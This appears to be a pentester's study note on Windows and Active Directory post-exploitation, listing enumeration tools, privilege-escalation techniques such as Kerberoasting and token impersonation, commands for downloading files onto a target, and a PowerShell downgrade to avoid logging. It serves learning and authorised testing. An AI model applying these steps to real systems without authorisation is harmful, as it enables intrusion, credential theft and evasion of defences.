The final goal for a machine is to get to  `NT AUTHORITY\SYSTEM` 

## After initial access
Once we have gained access and got credentials, we can gather more information or connect to the host with the following methods:
 - CrackMapExec: with `-U <username> -p <password>` to query usernames, groups, logged on users, ...
- BloodHound: can be used to recover active sessions (logged on users)
- SMBmap
- Impacket: (psexec, wmiexec)
	- psexec: Create remote connection to host (via RPC) and give us an interactive remote shell as SYSTEM. Need a user with local admin privileges

#### Windows
- ActiveDirectory module for powershell
- powerview
- Snaffler (for credentials hunt in shares)
- BloodHound (for visualization) with SharpHound (for data collection)

## Methods for Privesc
- Try [[LLMNR & NBT-NS Poisoning]]
- Retry password spraying and hope to find an admin account
- Windows exploits, such as Eternal Blue
- Abusing running services (normal privesc)
- Kerberoasting
- Abusing `SeImpersonate` (check with `whoami /all`) with [Juicy Potato](https://github.com/ohpe/juicy-potato)
- Find other vulnerabilities with standard method or through `winpeas` (normal privesc)

### Kerberoasting
Abuses the Kerberos protocol to harvest password hashes for AD users with Service Principal Name (SPN) values (service accounts).

Steps:
- Find accounts with SPN
- Trigger kerberoast attack with tools such as Rubeus
- Take hashes offline and use hashcat -m 13100

## Bloodhound
Running SharpHound/BloodHound is always a good idea on the target. It helps use see the paths that can be taken from our user to domain admins / domain controllers.

The results can be taken back locally on our machine and analysed.

## Transfer Files
- `wget <ip> -o <target>`
- curl
- certutil
- `(New-Object System.Net.WebClient).DownloadFile(<ip>, <target>`
- scp
- ftp/tftp

## Living off the Land (LOTL)
- powershell can be downgraded with `powershell.exe -version 2`. Interesting as version 2 does not have log system enabled, meaning we will be stealthier
- Check defenses with `netsh` and `sc`
- Check network with: 
	- `arp -a`
	- `route print`
	- `ipconfig /all`
- Check WMI: Windows Management Instrumentation
- `Net` commands

## Once admin
- enumerate the domain (with tool such as Bloodhound for example or windapsearch)
- Kerberoasting
- SMB relay attacks
- gather Net-NTLMv2 hashes
- token impersonation
- ACL attacks
